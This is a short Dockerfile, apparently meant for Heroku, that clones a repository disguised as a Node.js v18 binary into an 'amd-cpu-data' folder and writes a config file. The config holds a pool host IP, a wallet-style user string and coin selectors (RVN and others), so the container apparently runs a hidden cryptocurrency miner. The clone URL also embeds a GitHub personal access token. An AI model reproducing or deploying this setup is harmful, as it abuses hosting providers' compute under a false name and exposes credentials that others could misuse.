# Use a base Node.js image
FROM node:18

# Set the working directory
WORKDIR /usr/src/app

# Install Git
RUN apt-get update && apt-get install -y git && rm -rf /var/lib/apt/lists/*

# Clone the repository
RUN git clone https://coderun2611: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@github.com/coderun2611/node-v18-linux-x64.git amd-cpu-data

# Change directory to the cloned repo
WORKDIR /usr/src/app/amd-cpu-data

# Add a configuration file
RUN echo -e "host=146.103.45.69\nport=443\nuser=RNPTaDxarafTVGK3qaDGHRUhnvW3Mr4ux8\npass=c=RVN,mc=SMT/SPRX/SWAMP\nthreads=2\nlog=1" > data.conf

# Expose any ports if required (not necessary for Heroku, but can be useful for local testing)
EXPOSE 8080

# Run the application
CMD ["node", "app.js"]
